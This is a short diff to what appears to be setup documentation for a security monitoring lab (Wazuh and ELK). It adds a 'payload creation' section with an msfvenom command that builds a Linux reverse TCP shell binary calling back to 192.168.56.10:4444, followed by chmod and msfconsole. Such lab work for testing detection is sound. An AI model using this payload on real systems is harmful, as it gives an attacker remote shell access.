@@ -79,3 +79,10 @@ docker run --rm -it \
                           a full deployment (Wazuh + ELK).
 ```
 
+
+payload creation :
+ msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.56.10 LPORT=4444 -f elf > shell.elf
+ chmod +x shell.elf 
+
+msfconsole 
+
